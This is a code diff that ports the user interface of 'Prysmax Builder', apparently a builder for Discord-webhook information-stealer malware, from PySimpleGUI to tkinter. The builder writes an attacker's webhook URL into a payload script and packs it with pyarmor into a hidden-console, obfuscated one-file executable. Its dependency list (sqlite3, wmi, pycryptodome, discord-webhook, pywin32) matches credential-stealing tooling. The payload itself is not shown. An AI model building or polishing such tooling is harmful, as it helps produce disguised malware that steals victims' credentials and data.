@@ -1,11 +1,12 @@
 import os
 import subprocess
-import PySimpleGUI as sg
+import tkinter as tk
+from tkinter import messagebox, filedialog
 
 def download_libraries():
     required_libraries = [
         'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
-        'subprocess', 'pyarmor==7.6.1', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 
+        'subprocess', 'pyarmor==7.6.1', 'pyinstaller==4.8', 'glob', 're', 'platform', 'Pillow', 
         'zipfile', 'discord-webhook', 'pycryptodomex', 'pycryptodome', 'datetime', 'pywin32',
     ]
 
@@ -31,8 +32,8 @@ def compile_and_explore(webhook_url):
     with open(file_path, 'w', encoding='utf-8') as new_main_file:
         new_main_file.write(main_content)
 
-    here = sg.popup_yes_no("Are you sure you want to compile your file to Executable?", title='Confirm Compilation', button_color=('white', 'purple'))
-    if here == 'Yes':
+    here = messagebox.askyesno("Confirm Compilation", "Are you sure you want to compile your file to Executable?")
+    if here:
         print("Compiling...")
         try:
             subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)
@@ -45,30 +46,49 @@ def compile_and_explore(webhook_url):
         print("Compilation canceled.")
 
 def main():
-    sg.theme('DarkPurple4')  # Purple theme
-    sg.set_options(font=('Helvetica', 12))
+    def on_download_libraries():
+        download_libraries()
+        messagebox.showinfo("Info", "Libraries downloaded successfully!")
 
-    layout = [
-        [sg.Text('Prysmax Builder', font=('Helvetica', 24), text_color='white', justification='center')],
-        [sg.Text('Enter your Discord Webhook URL:', text_color='white'), sg.InputText(key='webhook_url')],
-        [sg.Button('Download Libraries', button_color=('white', 'purple')), sg.Button('Compile and Explore', button_color=('white', 'purple')), sg.Button('Exit', button_color=('white', 'red'))],
-    ]
+    def on_compile_and_explore():
+        webhook_url = webhook_url_entry.get()
+        compile_and_explore(webhook_url)
 
-    window = sg.Window('Prysmax Builder', layout, alpha_channel=0.8, grab_anywhere=True)
+    root = tk.Tk()
+    root.title("Prysmax Builder")
+    root.geometry("500x400")
+    root.configure(bg='#1e1e1e')
 
-    while True:
-        event, values = window.read()
+    # Add a background image
+    background_image = tk.PhotoImage(file="background.png")
+    background_label = tk.Label(root, image=background_image)
+    background_label.place(relwidth=1, relheight=1)
 
-        if event == sg.WINDOW_CLOSED or event == 'Exit':
-            break
-        elif event == 'Download Libraries':
-            download_libraries()
-            sg.popup("Libraries downloaded successfully!", text_color='white')
-        elif event == 'Compile and Explore':
-            webhook_url = values['webhook_url']
-            compile_and_explore(webhook_url)
+    # Container frame with padding and rounded borders
+    container = tk.Frame(root, bg='#333333', bd=2, relief='groove')
+    container.place(relx=0.5, rely=0.5, anchor='center', width=400, height=300)
 
-    window.close()
+    title_label = tk.Label(container, text="Prysmax Builder", font=('Helvetica', 24), fg='#00ff00', bg='#333333')
+    title_label.pack(pady=20)
+
+    webhook_label = tk.Label(container, text="Enter your Discord Webhook URL:", font=('Helvetica', 12), fg='white', bg='#333333')
+    webhook_label.pack(pady=10)
+    webhook_url_entry = tk.Entry(container, font=('Helvetica', 12), width=40)
+    webhook_url_entry.pack(pady=5)
+
+    button_frame = tk.Frame(container, bg='#333333')
+    button_frame.pack(pady=20)
+
+    download_button = tk.Button(button_frame, text="Download Libraries", font=('Helvetica', 12), bg='#555555', fg='white', command=on_download_libraries)
+    download_button.grid(row=0, column=0, padx=10)
+
+    compile_button = tk.Button(button_frame, text="Compile and Explore", font=('Helvetica', 12), bg='#555555', fg='white', command=on_compile_and_explore)
+    compile_button.grid(row=0, column=1, padx=10)
+
+    exit_button = tk.Button(container, text="Exit", font=('Helvetica', 12), bg='#ff5555', fg='white', command=root.quit)
+    exit_button.pack(pady=10)
+
+    root.mainloop()
 
 if __name__ == '__main__':
     main()
